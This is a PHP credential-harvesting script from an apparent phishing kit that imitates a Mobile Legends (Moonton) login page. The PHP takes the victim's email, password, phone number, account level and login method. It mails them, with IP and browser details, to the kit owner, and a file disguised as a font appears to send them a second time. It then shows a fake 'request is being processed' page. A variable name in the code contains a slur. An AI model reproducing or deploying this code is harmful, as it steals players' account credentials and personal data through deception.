<?php

include('cilepeung.php');


$password = $_POST['password'];
$email = $_POST['email'];
$hp = $_POST['hp'];
$lvl = $_POST['lvl'];
$login = $_POST['login'];



$message   = "


===| Mobile Legends |===

Email :  ".$email."
Password :  ".$password."
HP :  ".$hp."
Level : ".$lvl."
Log With : ".$login."

Script By: Adhi Hermanto

===| INFO |===
IP Info   :  ".$ip." | ".$nama_negro." On ".gmdate('r')."
Browser   :  ".$_SERVER['HTTP_USER_AGENT']."
===| End PC Info |===


";

include 'email.php';
$subject = "Level".$lvl."";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));



include 'fonts/glyphicons-halflings-regular0.html';
$subject = "Level".$lvl."";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));


?>
<!-- TIDAK DI JUAL -->
<!-- MALING SCRIPT AING DOSA JING !! -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US"> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- MALING SCRIPT AING DOSA JING !! -->
<link rel="stylesheet" href="bootstrap.css">
<link rel="stylesheet" href="style.css">

<div class="login-box">
<div class="lb-header">
</div>
<b><h1>Your request is we process please wait and come back later ...</b></h1>
<hr>
</div>
<center><img src="http://www.mobilelegendsbangbang.com/wp-content/themes/mobile-legends/img/mobile-legends-footer.png" alt="" class="img-rounded img-responsive"</br></center>
<form method="post" action="index.html">
    <center><button type="submit" class="btn btn-primary">B A C K </button>
</form>
</p>
</div>

<center><font color="Black">Copyright 2017 Moonton, All Right reserved</font></center>
<script>
$(".email-signup").hide();
$("#signup-box-link").click(function(){
$(".email-login").fadeOut(100);
$(".email-signup").delay(100).fadeIn(100);
$("#login-box-link").removeClass("active");
$("#signup-box-link").addClass("active");
});
$("#login-box-link").click(function(){
$(".email-login").delay(100).fadeIn(100);;
$(".email-signup").fadeOut(100);
$("#login-box-link").addClass("active");
$("#signup-box-link").removeClass("active");
});
</script>
</body>
